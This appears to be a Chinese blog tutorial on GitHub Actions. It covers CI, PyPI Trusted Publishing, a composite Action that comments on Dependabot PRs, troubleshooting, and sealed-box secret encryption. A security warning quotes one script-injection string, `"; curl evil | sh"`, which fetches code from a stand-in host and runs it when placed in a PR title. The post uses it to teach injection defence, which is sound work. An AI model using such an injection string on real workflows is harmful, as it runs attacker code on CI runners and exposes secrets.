---
title: GitHub Actions 自动化测试、发布与依赖升级 PR 实战
date: 2026-11-10
categories:
  - 学CS/SE
tags:
  - Git&Github
  - CI/CD
  - Python
  - Linux
  - Windows
desc: GitHub Actions 的核心概念、跨平台 CI、Python 包发布（PyPI Trusted Publishing）、自定义 Composite Action、Dependabot 升级 PR 自动评论的完整流程，以一个依赖升级影响分析工具为例，附排错表与密钥安全传输方法。
---

本文主要参考：

- <a href="https://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">阮一峰：GitHub Actions 入门教程</a>（2019 年，部分 Action 版本已过时，概念部分仍适用）
- <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax">GitHub Docs：Workflow syntax for GitHub Actions</a>
- <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax">GitHub Docs：Metadata syntax reference（action.yml）</a>
- <a href="https://docs.github.com/en/actions/tutorials/create-actions/create-a-composite-action">GitHub Docs：Creating a composite action</a>
- <a href="https://docs.github.com/actions/creating-actions/sharing-actions-and-workflows-from-your-private-repository">GitHub Docs：Sharing actions and workflows from your private repository</a>
- <a href="https://docs.github.com/en/code-security/reference/supply-chain-security/dependabot-options-reference">GitHub Docs：Dependabot options reference</a>
- <a href="https://docs.github.com/en/code-security/reference/supply-chain-security/dependabot-on-actions">GitHub Docs：Dependabot on GitHub Actions</a>
- <a href="https://docs.github.com/en/rest/guides/encrypting-secrets-for-the-rest-api">GitHub Docs：Encrypting secrets for the REST API</a>
- <a href="https://docs.github.com/en/rest/dependabot/secrets">GitHub Docs：REST API endpoints for Dependabot secrets</a>
- <a href="https://docs.pypi.org/trusted-publishers/using-a-publisher/">PyPI Docs：Publishing with a Trusted Publisher</a>
- <a href="https://packaging.python.org/en/latest/guides/publishing-package-distribution-releases-using-github-actions-ci-cd-workflows/">Python Packaging User Guide：Publishing releases using GitHub Actions</a>
- <a href="https://github.com/pypa/gh-action-pypi-publish">pypa/gh-action-pypi-publish</a>


<br>

## 概念

### CI / CD

（Continuous Integration / Continuous Delivery，持续集成 / 持续交付）

- **CI**：每次 push 或 PR 都自动构建、测试，尽早发现问题。
- **CD**：通过测试后自动打包、发布（例如上传到 PyPI、部署网站）。
- GitHub Actions 是 GitHub 内置的 CI/CD 平台，配置文件放在仓库的 `.github/workflows/` 下，用 YAML 编写。

### 组成

| 名词 | 含义 |
| :--- | :--- |
| Workflow | 一个 YAML 文件，描述"什么时候、做什么"。 |
| Event | 触发条件，如 `push`、`pull_request`、`workflow_dispatch`（手动）、`schedule`（定时）、推送 tag。 |
| Job | 工作流中的一个任务，在一台独立的 runner 上运行；多个 job 默认并行，可用 `needs` 串联。 |
| Step | Job 中的一步：要么 `run` 一段 shell，要么 `uses` 一个现成的 Action。 |
| Runner | 运行 job 的机器，如 `ubuntu-latest`、`windows-latest`、`macos-latest`。 |
| Action | 可复用的步骤单元，如 `actions/checkout`、`actions/setup-python`。 |
| Matrix | 用一份 job 定义展开出多种组合（多系统 / 多 Python 版本）。 |
| Artifact | job 之间传递文件（如构建好的 wheel）。 |
| Cache | 跨运行保存目录（依赖、模型调用缓存），加速且省钱。 |
| Secret | 加密保存的敏感值（API Key、Token），日志中自动打码。 |
| Environment | 带保护规则的部署目标（如 `pypi`），可要求人工审批。 |
| `GITHUB_TOKEN` | 每次运行自动生成的临时令牌，权限由 `permissions` 控制。 |
| OIDC | 运行时向第三方证明身份为"某仓库的某个工作流"，无需存长期密钥（PyPI Trusted Publishing 依赖它）。 |

<br>

## 工作流

### 最小例子

```yaml
name: CI

on:
  push:
    branches: ["**"]        # 所有分支
  pull_request:             # 所有 PR
  workflow_dispatch:        # 允许手动触发

permissions:
  contents: read            # 默认只读，最小权限原则

concurrency:                # 同一分支的新运行取消旧运行
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-python@v6
        with:
          python-version: "3.11"
          cache: pip
      - run: pip install -e '.[dev]'
      - run: python -m pytest -q
```

### 要点

- `permissions` 写在顶层为全局默认，写在 job 内覆盖；默认给最小权限，只在需要的 job 放开（如发布 job 的 `id-token: write`）。
- `concurrency` 避免同一分支堆积多个运行。
- `timeout-minutes` 防止卡死的任务耗尽额度。
- {% raw %}`${{ ... }}`{% endraw %} 是表达式，可读取 `github`、`inputs`、`secrets`、`matrix`、`steps` 等上下文。

### Job 之间传文件

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - run: python -m build
      - uses: actions/upload-artifact@v4
        with: {name: dist, path: dist/}

  check:
    needs: build                      # 等 build 完成
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: {name: dist, path: dist}
```

<br>

## 跨平台

### 矩阵

```yaml
jobs:
  package:
    strategy:
      fail-fast: false                # 一个系统失败不影响其他系统继续跑
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-python@v6
        with: {python-version: "3.11"}
      - name: Smoke test
        shell: bash                   # Windows 上也用 Git Bash，脚本只写一份
        run: |
          python -m venv "$RUNNER_TEMP/venv"
          if [ -x "$RUNNER_TEMP/venv/Scripts/python.exe" ]; then py="$RUNNER_TEMP/venv/Scripts/python.exe"; else py="$RUNNER_TEMP/venv/bin/python"; fi
          "$py" -m pip install dist/*.whl
          cd "$RUNNER_TEMP" && "$py" /path/to/smoke.py
```

### 常见坑

> [!WARNING]+ Windows 与 POSIX 的差异
>
> - **虚拟环境路径**：Windows 是 `venv/Scripts/python.exe`，Linux / macOS 是 `venv/bin/python`。
> - **换行符**：Windows 检出时可能把 LF 转成 CRLF，bash 脚本中多出的 `\r` 会导致 `$'\r': command not found`。用 `.gitattributes` 固定 `*.sh text eol=lf`；Python 写脚本文件时用 `write_text(..., newline="\n")`。
> - **反斜杠**：bash 把 `\` 当作转义字符，`scripts\tool\run.sh` 会变成 `scriptstoolrun.sh`。交给 bash 的路径统一用 `Path(p).as_posix()`，并用 `shlex.quote` 加引号。
> - **控制台编码**：Windows 管道默认是 cp1252 或 GBK，打印 `→` 等字符会抛出 `UnicodeEncodeError`。终端输出尽量用 ASCII（`->`），或在入口处 `sys.stdout.reconfigure(errors="replace")`；读写文件一律显式 `encoding="utf-8"`。
> - **`subprocess.run(["bash", ...])` 陷阱**：Windows 的进程查找会先搜索 `System32`，而那里的 `bash.exe` 是 WSL。WSL 进程看不到 Windows 侧设置的环境变量，测试中的 `ANTHROPIC_API_KEY` 等变量会"消失"。应当用完整路径调用 Git for Windows 的 bash（可由 `shutil.which("git")` 推出）。
> - **`isatty()`**：Windows 上把 stdin 重定向到 `NUL` 时，`sys.stdin.isatty()` 仍返回 True。判断"是否交互终端"时应同时检查 stdin 和 stderr。
> - **路径大小写与符号链接**：Windows 创建符号链接需要管理员或开发者模式；macOS 的临时目录是 `/var` → `/private/var` 的符号链接，比较路径前先 `resolve()`。

<br>

## 本地复现

推送后再等 CI 失败，往返成本很高。以下方法可在本地提前发现大部分问题。

### WSL + uv 跑 Linux 版 CI

Windows 机器上用 WSL 得到真正的 Linux 环境；系统 Python 版本过旧时，用 `uv` 安装独立的 Python，不动系统环境：

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
~/.local/bin/uv python install 3.11
uv venv -p 3.11 .venv && . .venv/bin/activate
uv pip install -e '.[dev]'
python -m pytest -q
```

> [!NOTE]+ 复现要用"干净的克隆"
>
> 直接把 Windows 工作区复制到 Linux，会带上 CRLF、未提交的文件和本地缓存，结果与 CI 不一致。正确做法是 `git clone` 一份，再 `git apply` 本地未提交的改动，然后按 workflow 中的步骤逐条执行。另外 WSL 的 `/tmp` 可能在虚拟机空闲后被清空，工作目录放在 `$HOME` 下更稳妥。

### 静态检查

| 工具 | 检查对象 | 命令 |
| :--- | :--- | :--- |
| actionlint | workflow 语法、表达式、`run` 中的 shell（配合 shellcheck） | `uvx --from actionlint-py --with shellcheck-py actionlint` |
| check-jsonschema | `action.yml`、workflow、`dependabot.yml` 的结构 | `uvx check-jsonschema --builtin-schema vendor.github-actions action.yml` |
| `bash -n` | `run:` 块的 bash 语法 | 用 PyYAML 取出 `run` 内容后交给 `bash -n` |
| `python -W error::SyntaxWarning` | Python 字符串中的非法转义（如 `"\d"`） | 对所有 `.py` 执行 `compile()` |
| ruff | 未使用的导入、未定义的名字、常见 bug | `uvx ruff check --select F,E9,B` |
| twine | 打出的包元数据是否合规 | `twine check --strict dist/*` |

> [!EXAMPLE]+ actionlint 需要 git 仓库
>
> actionlint 会向上查找 `.git` 来定位项目根目录。把 workflow 文件复制到临时目录检查时，需要先执行 `git init`，否则会报 "no project was found"。

<br>

## 打包

### 问题

研究型项目常用相对路径读配置，例如 `Path("config/llm.json")`。从仓库根目录运行没有问题，但会出现以下情况：

- 在其他目录执行命令时找不到文件；
- `pip install git+https://...` 或从 PyPI 安装后，仓库里的 `config/`、`prompts/` 根本不在安装目录中；
- 缓存目录写进 site-packages。

### 做法

1. **把资源打进 wheel**：在 `setup.py` 中扩展 `build_py`，构建时把 `config/`、`prompts/` 复制到 `包名/_resources/`。

   ```python
   class build_py_with_resources(build_py):
       def run(self):
           super().run()
           if getattr(self, "editable_mode", False):
               return                                   # 可编辑安装直接读仓库
           target = Path(self.build_lib) / "pkg" / "_resources"
           shutil.rmtree(target, ignore_errors=True)    # 避免残留旧文件
           for directory, pattern in (("config", "**/*.json"), ("prompts", "**/*.txt")):
               for path in (HERE / directory).glob(pattern):
                   dest = target / directory / path.relative_to(HERE / directory)
                   dest.parent.mkdir(parents=True, exist_ok=True)
                   shutil.copyfile(path, dest)
   ```

2. **sdist 也要带上源文件**：`MANIFEST.in` 中写 `graft config`、`graft prompts`，否则从 PyPI 的 sdist 构建时没有可复制的内容。
3. **运行时定位资源根目录**：源码检出时用仓库根，安装后用 `_resources`。旧代码依赖当前目录时，用一个带锁的上下文管理器临时 `chdir`，结束后切回：

   ```python
   @contextlib.contextmanager
   def in_resource_root():
       with _CWD_LOCK:                 # chdir 影响整个进程，多线程时需加锁
           previous = os.getcwd()
           os.chdir(resource_root())
           try:
               yield
           finally:
               os.chdir(previous)
   ```

4. **缓存放到用户目录**：优先读环境变量（如 `TOOL_CACHE_DIR`），否则按平台选择 `%LOCALAPPDATA%\tool\Cache`、`~/Library/Caches/tool`、`~/.cache/tool`。
5. **版本号单一来源**：`pyproject.toml` 中 `dynamic = ["version"]`，由 `[tool.setuptools.dynamic] version = {attr = "pkg.__version__"}` 读取。

### 验证

最可靠的检查是"在仓库外安装 wheel 并运行"：

```bash
python -m build
python -m venv /tmp/v && /tmp/v/bin/pip install dist/*.whl
cd /tmp && /tmp/v/bin/python smoke_installed.py
```

`smoke_installed.py` 断言：导入的不是源码目录；`_resources` 中的配置存在；缓存不在 site-packages；在无关目录下核心功能可以运行；命令行入口可用。

<br>

## 发布

### Trusted Publishing

（基于 OIDC 的免令牌发布）

传统做法是把 PyPI API Token 存成 secret，泄露风险高。Trusted Publishing 让 PyPI 信任"某仓库的某个工作流"，运行时通过 OIDC 交换短期凭证，仓库中不保存任何长期令牌。

**一次性设置：**

1. 在 pypi.org（或 test.pypi.org）的账号设置中添加 *pending publisher*：项目名、仓库所有者、仓库名、工作流文件名（如 `release.yml`）、Environment 名（如 `pypi`）。
2. 在 GitHub 仓库 *Settings → Environments* 中新建同名 Environment，可设置必须人工批准。

### 发布工作流

```yaml
on:
  push:
    tags: ["v*.*.*"]                 # 推送 tag 发正式版
  workflow_dispatch:
    inputs:
      target:
        type: choice
        options: [none, testpypi]   # 手动运行：只检查，或试发 TestPyPI
        default: none

jobs:
  build:      # 构建 + 检查 tag 与版本号、CHANGELOG 是否一致
  check:      # 三系统安装 wheel 并运行冒烟测试
  publish:
    needs: check
    if: startsWith(github.ref, 'refs/tags/')
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write                # Trusted Publishing 必需，放在 job 级别
    steps:
      - uses: actions/download-artifact@v4
        with: {name: dist, path: dist}
      - uses: pypa/gh-action-pypi-publish@release/v1
  publish-testpypi:
    needs: check
    if: github.event_name == 'workflow_dispatch' && inputs.target == 'testpypi'
    environment: testpypi
    permissions: {id-token: write}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: {name: dist, path: dist}
      - uses: pypa/gh-action-pypi-publish@release/v1
        with:
          repository-url: https://test.pypi.org/legacy/
```

> [!WARNING]+ 版本号不能重复
>
> PyPI 与 TestPyPI 都不允许重复上传同一版本号，即使删除后也不行。试发时可在构建前把版本改为 `X.Y.Z.devN`（`N` 取 `GITHUB_RUN_NUMBER`），每次运行自动唯一。从 TestPyPI 安装时需加 `--extra-index-url https://pypi.org/simple/`，因为依赖包不在 TestPyPI 上。

> [!NOTE]+ 手动触发的前提
>
> `workflow_dispatch` 的 "Run workflow" 按钮只对**默认分支上存在的**工作流文件显示，新加的发布工作流需要先合并到 main。

> [!NOTE]+ 发布前的确认
>
> 发到 PyPI 意味着源码公开（sdist 中包含完整源码）。私有仓库、多人合作或有课程 / 公司约束的项目，发布前需确认所有作者同意。

<br>

## 自定义 Action

### Composite Action

（复合 Action：把多个步骤打包成一个可被 `uses:` 引用的单元）

仓库根目录放 `action.yml` 后，其他仓库即可 `uses: OWNER/tool-repo@ref` 调用。

```yaml
name: Tool predict
description: Comment on dependency-upgrade PRs with the files likely to break.
inputs:
  anthropic-api-key: {required: false, default: ""}
  github-token:      {required: false, default: "${{ github.token }}"}
  max-cost:          {required: false, default: "1.00"}
  enabled:           {required: false, default: "true"}
outputs:
  affected-files:
    value: ${{ steps.predict.outputs.affected-files }}
runs:
  using: composite
  steps:
    - uses: actions/setup-python@v6
      if: inputs.enabled == 'true'
      with: {python-version: "3.11"}
    - name: Install
      if: inputs.enabled == 'true'
      shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
      run: python -m pip install --quiet "${ACTION_PATH}[llm]"
    - name: Predict and comment
      id: predict
      if: inputs.enabled == 'true'
      shell: bash
      env:
        ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
        INPUT_GITHUB_TOKEN: ${{ inputs.github-token }}
        INPUT_MAX_COST: ${{ inputs.max-cost }}
      run: python -P -m tool.github_action
```

### 安全要点

> [!WARNING]+ 输入只经环境变量传递
>
> 不要把 {% raw %}`${{ inputs.xxx }}`{% endraw %} 或 {% raw %}`${{ github.event.pull_request.title }}`{% endraw %} 直接写进 `run:`。表达式会在 shell 执行前被原样替换，PR 标题中的 `"; curl evil | sh"` 就会被当作命令执行（脚本注入）。正确做法是写到 `env:`，脚本中读 `$INPUT_X` 或 `os.environ`。

- **`python -P`**：composite 步骤的工作目录是调用方的仓库，`python -m` 默认会把当前目录放在 `sys.path` 最前面。若调用方仓库中有 `logging/`、`types.py` 之类的同名模块，会覆盖标准库。`-P`（Python 3.11+）可以避免这一点。
- **Composite 没有自动的 `INPUT_*` 变量**：其他类型的 Action 会自动生成 `INPUT_<NAME>`，composite 需要在 `env:` 中自己映射。
- **布尔输入是字符串**：`if: inputs.enabled == 'true'` 比较的是字符串，文档需写明只接受 `"true"` / `"false"`。
- **`setup-python` 有副作用**：它会改变同一 job 后续步骤的 `python`，建议调用方把该 Action 放在单独的 job。
- **输出与摘要**：向 `$GITHUB_OUTPUT` 追加 `key=value` 产生输出；向 `$GITHUB_STEP_SUMMARY` 追加 Markdown，会显示在运行摘要页。

### PR 评论的写法

- **只保留一条评论**：在正文放隐藏标记 `<!-- tool:predict -->`，每次运行先列出评论，找到带标记且作者类型为 `Bot` 的那条就 PATCH 更新，否则 POST 新建。只匹配 Bot，避免覆盖人类引用了标记的评论。
- **转义模型与文档文本**：模型输出或 changelog 原文可能包含 `[链接](https://...)`、`![](追踪图片)`、`@某人`、HTML。写入评论前应转义 Markdown 元字符、HTML，并在 `@` 后插入零宽空格；代码片段用比内容中最长反引号串更长的反引号包裹；链接 URL 用 `urllib.parse.quote` 编码。
- **长度限制**：评论最多 65,536 字符；截断时应在章节边界截断，避免留下未闭合的表格或 `<details>`。

<br>

## Dependabot

### 配置

`.github/dependabot.yml`：

```yaml
version: 2
updates:
  - package-ecosystem: pip
    directory: "/"
    schedule:
      interval: daily
    allow:
      - dependency-name: pyee        # 只为指定包开 PR，便于测试
    open-pull-requests-limit: 1
```

推送后 Dependabot 通常在几分钟内开出 "Bump X from A to B" 的 PR。

### 权限规则

> [!INFO]+ Dependabot 触发的工作流
>
> - 由 Dependabot 触发的 `pull_request` 运行，`GITHUB_TOKEN` 默认只读，可用 workflow 中的 `permissions:` 放开（例如 `pull-requests: write` 才能评论）。
> - 这类运行**只能读取 Dependabot secrets**，读不到 Actions secrets。同一个 Key 需要在 *Settings → Secrets and variables → Dependabot* 中单独添加。
> - 新加的 secret 只对之后的运行生效，旧运行需要重跑，或在 PR 中评论 `@dependabot rebase` 触发一次新运行。

### 找出升级了哪些包

- 不应只解析 PR 标题：Renovate 的标题不含旧版本，grouped update 的标题不含包名。更通用的方法是**比较 PR 前后的依赖文件**：`requirements*.txt`、`pyproject.toml`（PEP 621 / Poetry）、`setup.cfg`、`Pipfile`。只有清单文件没有变化时，才看 `poetry.lock`、`uv.lock`、`Pipfile.lock`，因为锁文件还会带出传递依赖的变化。
- **比较对象**：`actions/checkout` 默认检出 PR 的合并提交（`refs/pull/N/merge`），它建立在 base 分支的**最新**提交上。事件中的 `pull_request.base.sha` 可能更旧，直接比较会把期间合并进 main 的其他升级也算进来。应比较合并提交与它的**第一个父提交**；父提交 ID 写在提交对象中，深度为 1 的克隆也能读到。
- **monorepo**：`git diff --name-only base head -- .` 加上路径限定，只统计 `working-directory` 下的文件。
- `[build-system] requires` 中的 setuptools 不是项目依赖，解析 `pyproject.toml` 时应排除。

<br>

## 私有 Action

### 同一账号下

私有仓库中的 Action 默认不能被其他仓库调用。需要在 Action 所在仓库 *Settings → Actions → General → Access* 中选择 "Accessible from repositories owned by the user"，然后 Save。

> [!WARNING]+ 只对私有仓库开放
>
> 该选项只允许**同一所有者的私有仓库**调用。调用方仓库一旦公开，或属于其他账号，`uses:` 会失败并报 `Unable to resolve action ..., repository not found`。

### 跨账号

调用方属于其他账号时，常见做法如下：

| 做法 | 说明 |
| :--- | :--- |
| 组织 | 把两个仓库移入同一个组织，Access 选 "Accessible from repositories in the organization"。 |
| Deploy Key | 在 Action 仓库添加只读 deploy key，调用方用 `actions/checkout` 的 `ssh-key` 拉取到 `build/` 等被扫描逻辑忽略的目录，再 `uses: ./build/action`。 |
| 公开 | Action 仓库公开后，任何仓库都能直接调用。 |

<br>

## 例子

以一个"预测依赖升级会影响哪些文件"的 Python 工具为例，记录从 CI 修复到真实 PR 测试的完整过程。

### 目标

- 本地命令：`tool predict --repo . --package pydantic --from 1.10.9 --to 2.11.7 --max-cost 2`，先估算费用，超出上限则停下；输出 Top-5 文件和每个文件的证据行（`file:line`）。
- 发布：可通过 `pip install git+https://...` 安装，并发布到 PyPI。
- 集成：作为 GitHub Action，在 Dependabot 升级 PR 下自动评论。

### 测试仓库

单独建一个私有的沙盒仓库 `OWNER/action-sandbox`，内容故意设计成"已知答案"：

```text
requirements.txt      pyee==8.1.0
bus/client.py         from pyee import ExecutorEventEmitter   ← pyee 12 起不能从顶层导入
tests/test_bus.py     同样使用 ExecutorEventEmitter            ← 也应被标出
bus/format.py         与 pyee 无关                            ← 不应被标出
.github/dependabot.yml   只允许 pyee 的升级 PR
.github/workflows/tool.yml
```

```yaml
# .github/workflows/tool.yml
on:
  pull_request:
    paths: ["requirements*.txt", "pyproject.toml"]
permissions:
  contents: read
  pull-requests: write
jobs:
  predict:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: OWNER/tool-repo@main
        with:
          anthropic-api-key: ${{ secrets.ANTHROPIC_API_KEY }}
          max-cost: "0.75"
```

### 过程

1. 推送沙盒仓库，约 90 秒后 Dependabot 开出 PR #1："Bump pyee from 8.1.0 to 16.0.1"。
2. 第一次运行在 3 秒内失败，原因是 `Unable to resolve action`：Action 仓库的 Access 尚未开放。
3. 本地先做可控验证：把 PR 的合并提交拉到本地，用与 runner 相同的环境变量运行入口模块，确认能正确识别出升级 `pyee 8.1.0 -> 16.0.1`、找到 changelog，并在缺少 Key 时给出清晰提示、job 正常退出。
4. 开放 Access，用加密方式添加 Dependabot secret（见"密钥"一节），在 PR 中评论 `@dependabot rebase` 触发新运行。
5. 第二次运行成功，用时约 1 分 20 秒，花费约 $0.10。

### 结果

| 排名 | 文件 | 分数 | 证据行 | 判断 |
| :--- | :--- | :--- | :--- | :--- |
| 1 | `bus/client.py` | 0.97 | 第 7 行 import、第 12 行实例化 | 正确 |
| 2 | `tests/test_bus.py` | 0.93 | 第 1 行 import、第 8 行实例化 | 正确 |
| 3 | `bus/__init__.py` | 0.08 | 第 1 行转导出 | 合理（间接相关） |
| 4 | `bus/format.py` | 0.02 | 无关联 API 变化 | 应隐藏 |

> [!EXAMPLE]+ 结论与改进点
>
> - 证据行逐行对照源码，全部指向真实的破坏位置；引用的变化为 `pyee.ExecutorEventEmitter → pyee.executor.ExecutorEventEmitter`。
> - changelog 中共抽取 18 条 API 变化，只把仓库实际用到的 3 条放进排名提示词，控制了成本。
> - 改进点 1：分数接近 0 且无关联变化的文件不应出现在"需要修改"的表格中。
> - 改进点 2：`actions/cache@v4` 触发 Node 20 弃用警告，应升级到新版本。
> - 沙盒保留不合并的 PR #1 作为回归测试：发版前评论 `@dependabot rebase` 即可重跑。

<br>

## 排错

| 现象 | 原因 | 处理 |
| :--- | :--- | :--- |
| 重构后所有平台 CI 同时失败 | 删除了一个被其他模块引用的函数名（`module.func` 形式的调用不会在导入时报错，运行到才失败） | 恢复为兼容性重导出；重构前用 `grep` 搜索所有 `模块名.属性` 形式的引用 |
| 在其他目录运行命令报 `FileNotFoundError: config/llm.json` | 代码按当前目录读取相对路径 | 资源打包 + 运行时切换到资源根目录 |
| Windows 上 bash 脚本测试找不到文件 | `subprocess` 启动的是 System32 中 WSL 的 bash，且路径中的反斜杠被当作转义 | 用完整路径调用 Git Bash，路径用正斜杠并加引号 |
| Windows 上测试读不到 `read_text()` 的内容 | 未指定编码，GBK 系统按 GBK 解码 UTF-8 文件 | 所有文件读写显式 `encoding="utf-8"` |
| `git push` 报 `Repository not found`，但仓库确实存在 | 本机凭据管理器缓存的 fine-grained token 未包含新仓库；GitHub 对无权访问的私有仓库统一返回 404 | 更新 token 的仓库范围，或用 GitHub Desktop 推送 |
| 推送新仓库前发现远端已有提交 | 新建仓库时勾选了 README / LICENSE | `git rebase origin/main` 后普通推送，不使用强制推送 |
| Action 报 `Unable to resolve action ..., repository not found` | 私有 Action 仓库未开放 Access，或调用方不是同一所有者的私有仓库 | 开放 Access，或改用组织 / deploy key |
| 评论提示 `ANTHROPIC_API_KEY is not set` | Dependabot PR 读不到 Actions secrets | 在 Dependabot secrets 中添加同名 secret 并重跑 |
| 首次运行因费用上限被拒 | 未缓存时预检 = 抽取估算 + 固定的排名预留金额 | 先 `--dry-run` 看估算，再设置 `max-cost` |
| 交互确认在 CI 中仍然弹出 | Windows 的 `NUL` 被识别为终端 | 同时检查 stdin 与 stderr 的 `isatty()` |

<br>

## 密钥

### 原则

- API Key、Token、私钥**不发群聊、不写进仓库、不贴进 AI 对话**。一旦出现在聊天记录中，应视为泄露，立即在服务方后台删除（revoke）。
- 测试用 Key 单独创建，并设置低额度，测完删除。
- GitHub Token 优先用 fine-grained：只勾选目标仓库，只给需要的权限（如 "Dependabot secrets: Read and write"），设置较短的有效期。
- 个人账号下的仓库，**只有所有者能添加 secret**；协作者没有 Settings 权限，GitHub 也不支持给协作者更高的角色。

### 公钥加密传输

（Libsodium Sealed Box）

GitHub 为每个仓库维护一对密钥：公钥任何有权限的人都能获取，私钥只在 GitHub 内部。网页上添加 secret 时，浏览器先用公钥加密再上传。借助这一机制，Key 的持有者可以自己加密，仓库所有者只上传密文，全程看不到明文。

**流程：**

```text
仓库所有者 ── 公钥 key + key_id ──▶ Key 持有者
Key 持有者 ── 本地加密 ──▶ 密文（只有 GitHub 能解）
Key 持有者 ── 密文 ──▶ 仓库所有者 ── REST API 上传 ──▶ GitHub
```

**第 1 步：所有者获取公钥**（在 Git Bash 中执行，避免 PowerShell 的引号问题）

```bash
read -rs GITHUB_TOKEN && export GITHUB_TOKEN     # 粘贴 token，不回显
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/repos/OWNER/action-sandbox/dependabot/secrets/public-key
# 返回 {"key_id":"...","key":"..."}，两者都是公开信息
```

**第 2 步：持有者本地加密**

```python
# seal_secret.py —— pip install pynacl
import base64, getpass, sys
from nacl import encoding, public

def seal(public_key_b64: str, secret: str) -> str:
    key = public.PublicKey(public_key_b64.encode(), encoding.Base64Encoder())
    return base64.b64encode(public.SealedBox(key).encrypt(secret.encode())).decode()

if __name__ == "__main__":
    secret = getpass.getpass("Secret (not shown): ").strip()   # 输入不回显
    print(seal(sys.argv[1], secret))
```

```bash
python seal_secret.py "<第1步得到的 key>"
```

输出的密文可以通过普通聊天发送。Sealed box 的密文长度等于明文长度加 48 字节，可据此检查对方是否粘贴完整，而无需解密。

**第 3 步：所有者上传**

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X PUT \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/repos/OWNER/action-sandbox/dependabot/secrets/ANTHROPIC_API_KEY \
  -d '{"encrypted_value":"<密文>","key_id":"<key_id>"}'
# 201 = 新建成功，204 = 更新成功
# 401/403 = token 权限不足；422 = 公钥已变化，需重新获取并加密
```

需要 Actions secret 时，把两个 URL 中的 `dependabot` 换成 `actions`。

> [!WARNING]+ 局限
>
> 这一方法保证明文不经过所有者之手，但仓库所有者始终可以修改工作流，让 secret 在运行中被使用或外传。GitHub 只保证"网页与日志中不显示明文"。因此仍应使用专用、低额度、可随时作废的 Key。

### 其他方案对比

| 方案 | 优点 | 代价 |
| :--- | :--- | :--- |
| 直接私发 Key | 最快，一次沟通 | 所有者会看到明文 |
| 公钥加密 | 不转让仓库，不暴露明文 | 需要 token 与两条命令 |
| 转让仓库 + deploy key | Key 持有者自己管理 secret | 步骤最多；转让后原所有者只剩协作者权限 |
| 组织 | 多人都有管理员权限 | 仓库地址变化，引用需全部更新 |

<br>

